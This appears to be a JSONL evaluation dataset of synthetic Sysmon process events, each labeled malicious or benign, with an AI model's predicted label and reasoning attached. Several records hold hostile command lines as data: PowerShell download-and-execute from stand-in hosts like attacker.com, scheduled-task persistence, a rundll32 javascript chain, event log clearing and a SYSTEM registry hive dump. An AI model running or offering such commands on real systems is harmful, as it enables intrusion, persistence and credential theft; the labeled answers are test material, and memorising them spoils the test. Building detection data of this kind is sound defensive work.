{"EventID": 1, "EventTime": "2020-05-01 22:56:20", "UtcTime": "2020-05-01T22:56:20.000Z", "Hostname": "NASHUA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "net view \\\\fileserver", "ProcessId": "1524", "ProcessGUID": "{6bbf237a-05f4-5eac-05f4-0000000005f4}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "4312", "ParentProcessGUID": "{6bbf237a-10d8-5eac-10d8-0000000010d8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "share_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:20] | PID=1524 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=net view \\\\fileserver", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing net view command from explorer.exe to view shared resources on a specific fileserver - legitimate network resource browsing activity typical in corporate environments.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:45", "UtcTime": "2020-05-01T22:56:45.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c powershell Invoke-Command -ComputerName TARGET-PC -ScriptBlock {Get-Process}", "ProcessId": "1261", "ProcessGUID": "{6bbf237a-04ed-5eac-04ed-0000000004ed}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:45] | PID=1261 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c powershell Invoke-Command -ComputerName TARGET-PC -ScriptBlock {Get-Process}", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "NETWORK SERVICE account spawning cmd.exe from explorer.exe to execute remote PowerShell commands is highly suspicious - indicates potential lateral movement or remote execution abuse with unusual privilege context.", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:20", "UtcTime": "2020-05-01T22:57:20.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -c \"(New-Object Net.WebClient).DownloadString('http://malicious.com/data') | IEX\"", "ProcessId": "1289", "ProcessGUID": "{6bbf237a-0509-5eac-0509-000000000509}", "ParentImage": "C:\\Windows\\System32\\schtasks.exe", "ParentProcessId": "1278", "ParentProcessGUID": "{6bbf237a-04fe-5eac-04fe-0000000004fe}", "ParentCommandLine": "schtasks /create /tn \"EdgeBrowserUpdate\" /tr \"powershell.exe -nop -w hidden -c \\\"(New-Object Net.WebClient).DownloadString('http://malicious.com/data') | IEX\\\"\" /sc daily", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:20] | PID=1289 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\powershell.exe | Parent=C:\\Windows\\System32\\schtasks.exe | CMD=powershell.exe -nop -w hidden -c \"(New-Object Net.WebClient).DownloadString('http://malicious.com/data') | IEX\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell launched by schtasks with hidden window, no profile, downloading and executing code from remote server using IEX - classic command and control pattern with fileless execution.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:40", "UtcTime": "2020-05-01T22:56:40.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Clear-EventLog -LogName System", "ProcessId": "1200", "ProcessGUID": "{6bbf237a-04b0-5eac-04b0-0000000004b0}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1150", "ParentProcessGUID": "{6bbf237a-047e-5eac-047e-00000000047e}", "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c taskmgr", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "log_clearing", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:40] | PID=1200 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell Clear-EventLog -LogName System", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell command clearing the System event log, executed by NETWORK SERVICE account - clear indicator of defense evasion to hide malicious activity traces.", "confidence": "high", "attack_technique": "defense_evasion"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:31", "UtcTime": "2020-05-01T22:56:31.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c bitsadmin /transfer job1 /addfile C:\\temp\\encoded.txt C:\\temp\\encoded.txt", "ProcessId": "4022", "ProcessGUID": "{6bbf237a-0fb6-5eac-0fb6-000000000fb6}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "3112", "ParentProcessGUID": "{6bbf237a-0c28-5eac-0c28-000000000c28}", "ParentCommandLine": "cmd.exe /c bitsadmin /transfer job1 /create", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:31] | PID=4022 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=cmd.exe /c bitsadmin /transfer job1 /addfile C:\\temp\\encoded.txt C:\\temp\\encoded.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account using bitsadmin with suspicious file transfer involving 'encoded.txt' in temp directory - likely data staging or download activity using LOTL technique.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:42", "UtcTime": "2020-05-01T22:55:42.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "C:\\Windows\\System32\\cmd.exe /c start rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')\\\"\")", "ProcessId": "4128", "ProcessGUID": "{6bbf237a-1020-5eac-1020-000000001020}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1352", "ParentProcessGUID": "{6bbf237a-0548-5eac-0548-000000000548}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lolbin_execution", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:42] | PID=4128 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=C:\\Windows\\System32\\cmd.exe /c start rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')\\\"\")", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Highly suspicious command chain using rundll32.exe with JavaScript to execute obfuscated PowerShell that downloads and executes a remote script from attacker.com with execution policy bypass - classic fileless malware delivery.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:10", "UtcTime": "2020-05-01T22:57:10.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cacls.exe", "CommandLine": "cacls C:\\Program Files\\Common Files /e /g Everyone:F", "ProcessId": "1278", "ProcessGUID": "{6bbf237a-04fe-5eac-04fe-0000000004fe}", "ParentImage": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "ParentProcessId": "1256", "ParentProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentCommandLine": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "permission_manipulation", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:10] | PID=1278 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cacls.exe | Parent=C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr | CMD=cacls C:\\Program Files\\Common Files /e /g Everyone:F", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "The cacls command is granting full control permissions to Everyone on a system directory, executed by a suspicious parent process from ProgramData with a screensaver extension (.scr) - indicative of permission manipulation for privilege escalation or persistence.", "confidence": "high", "attack_technique": "permission_manipulation"}}
{"EventID": 1, "EventTime": "2025-10-10 08:04:50", "UtcTime": "2025-10-10T08:04:50.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /s C:\\Windows\\System32\\vbscript.dll", "ProcessId": "2567", "ProcessGUID": "{d26388cc-4450-9f5f-2500-000000001900}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "4512", "ParentProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000400}", "ParentCommandLine": "cmd.exe /c dir C:\\Users", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:50] | PID=2567 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\regsvr32.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=regsvr32.exe /s C:\\Windows\\System32\\vbscript.dll", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Regsvr32.exe registering a legitimate Windows system DLL (vbscript.dll) from System32 directory. This is a standard system maintenance operation, though the /s flag suppresses output.", "confidence": "medium", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:01:10", "UtcTime": "2025-10-10T08:01:10.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\regedit.exe", "CommandLine": "regedit.exe", "ProcessId": "2345", "ProcessGUID": "{cdef5a4f-1325-5eb4-1000-000000000b00}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5ead-1000-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:10] | PID=2345 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\regedit.exe | Parent=C:\\Windows\\explorer.exe | CMD=regedit.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User launching Registry Editor (regedit.exe) from Windows Explorer - standard administrative activity with normal parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:11", "UtcTime": "2020-05-01T22:56:11.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe  Get-ChildItem -Path c:\\documents -Recurse -Include *.pdf,*.docx -ErrorAction SilentlyContinue", "ProcessId": "1725", "ProcessGUID": "{6bbf237a-06bd-5eac-06bd-0000000006bd}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1700", "ParentProcessGUID": "{6bbf237a-06a4-5eac-06a4-0000000006a4}", "ParentCommandLine": "cmd.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:11] | PID=1725 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell.exe  Get-ChildItem -Path c:\\documents -Recurse -Include *.pdf,*.docx -ErrorAction SilentlyContinue", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell running as SYSTEM recursively searching for sensitive document types (PDF, DOCX) across the documents folder with error suppression - typical data discovery/staging behavior before exfiltration.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:44", "UtcTime": "2020-05-01T22:56:44.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg save HKLM\\SYSTEM C:\\Users\\Public\\sys.hiv", "ProcessId": "1026", "ProcessGUID": "{6bbf237a-0402-5eac-0402-000000000402}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "420", "ParentProcessGUID": "{6bbf237a-01a4-5eac-01a4-0000000001a4}", "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "memory_credential_dumping", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:44] | PID=1026 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\reg.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=reg save HKLM\\SYSTEM C:\\Users\\Public\\sys.hiv", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using reg.exe to save the SYSTEM registry hive to a public directory - this is a credential dumping technique used to extract sensitive system secrets and passwords offline.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 3, "EventTime": "2025-10-10 08:01:10", "UtcTime": "2025-10-10T08:01:10.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Chrome\\chrome.exe", "ProcessId": "2001", "ProcessGUID": "{12345678-1234-5678-1234-567812340002}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "SourcePort": "50001", "DestinationIp": "1.1.1.1", "DestinationPort": "443", "DestinationHostname": "cloudflare-dns.com", "Protocol": "tcp", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:10] | PID=2001 | User=WORKSTATION\\user | Image=C:\\Program Files\\Chrome\\chrome.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Chrome browser process running under normal user context without suspicious command-line arguments or unusual behavior - standard application usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-30 03:33:00", "UtcTime": "2025-10-30T03:33:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\VideoLAN\\VLC\\vlc.exe", "CommandLine": "\"C:\\Program Files\\VideoLAN\\VLC\\vlc.exe\" C:\\Users\\jsmith\\Videos\\movie.mp4", "ProcessId": "5678", "ProcessGUID": "{567289ab-2cde-5617-e89a-8600585b8444}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{123e4567-e89b-12d3-a456-426614174000}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Videos", "LogonId": "0x12345", "_label": "benign", "_source": "llm", "prompt": "[2025-10-30 03:33:00] | PID=5678 | User=CORP\\jsmith | Image=C:\\Program Files\\VideoLAN\\VLC\\vlc.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\VideoLAN\\VLC\\vlc.exe\" C:\\Users\\jsmith\\Videos\\movie.mp4", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "VLC media player launched by Windows Explorer to play a video file from the user's Videos folder - normal user activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:13", "UtcTime": "2020-05-01T22:56:13.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c copy C:\\Users\\Public\\Documents\\sensitive_data.txt C:\\temp\\data.cab", "ProcessId": "1524", "ProcessGUID": "{6bbf237a-05f4-5eac-05f4-0000000005f4}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "432", "ParentProcessGUID": "{6bbf237a-01b0-5eac-01b0-0000000001b0}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:13] | PID=1524 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c copy C:\\Users\\Public\\Documents\\sensitive_data.txt C:\\temp\\data.cab", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "NETWORK SERVICE account running cmd.exe spawned by explorer.exe to copy sensitive data to temp directory - highly suspicious privilege context and parent-child relationship indicating potential data staging or exfiltration.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 15, "EventTime": "2025-10-10 08:04:00", "UtcTime": "2025-10-10T08:04:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "7890", "ProcessGUID": "{9def460c-ecf1-5eb0-1000-000000000700}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE", "TargetFilename": "C:\\Users\\jsmith\\Documents\\Document1.docx:Zone.Identifier", "CreationUtcTime": "2025-10-10T08:04:00.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:00] | PID=7890 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Word (WINWORD.EXE) launched from legitimate Office installation directory by domain user - standard office application usage.", "confidence": "high", "attack_technique": ""}}
